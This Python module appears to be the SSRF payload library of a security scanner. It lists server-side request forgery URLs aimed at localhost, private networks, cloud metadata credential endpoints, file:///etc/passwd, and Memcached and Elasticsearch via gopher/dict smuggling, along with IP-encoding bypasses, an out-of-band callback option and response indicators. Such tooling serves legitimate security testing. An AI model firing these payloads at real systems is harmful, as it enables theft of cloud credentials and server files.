"""
SSRF payload library.
"""

from __future__ import annotations


# ── SSRF URL targets ──────────────────────────────────────────────────────────

INTERNAL_TARGETS: list[str] = [
    # Localhost variants
    "http://127.0.0.1/",
    "http://127.0.0.1:80/",
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:8443/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://0/",
    # Class A private
    "http://10.0.0.1/",
    "http://10.1.1.1/",
    "http://192.168.1.1/",
    "http://172.16.0.1/",
    # Cloud metadata
    "http://169.254.169.254/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/computeMetadata/v1/",           # GCP
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP alt
    "http://169.254.169.254/metadata/instance",              # Azure
    # Bypass encodings
    "http://0177.0.0.1/",    # Octal
    "http://2130706433/",    # Decimal
    "http://0x7f000001/",    # Hex
    "http://127.1/",         # Short form
    "http://127.000.0.1/",   # Leading zeros
    # DNS rebinding
    "http://localtest.me/",
    "http://customer1.app.localhost.my.company.127.0.0.1.nip.io/",
    # File protocol
    "file:///etc/passwd",
    "file:///C:/Windows/win.ini",
    # Protocol smuggling
    "dict://127.0.0.1:11211/stat",    # Memcached
    "gopher://127.0.0.1:9200/_",      # Elasticsearch
]


def get_ssrf_payloads(oob_url: str | None = None) -> list[str]:
    payloads = list(INTERNAL_TARGETS)
    if oob_url:
        payloads += [
            oob_url,
            oob_url.rstrip("/") + "/ssrf-callback",
        ]
    return payloads


SSRF_INDICATORS: list[str] = [
    "root:x:",           # /etc/passwd echoed back
    "[boot loader]",     # win.ini
    "ami-id",            # AWS metadata
    "hostname",          # metadata response
    "instance-id",
    "computeMetadata",
    "openssl",
    "Server: nginx",
    "Server: Apache",
]
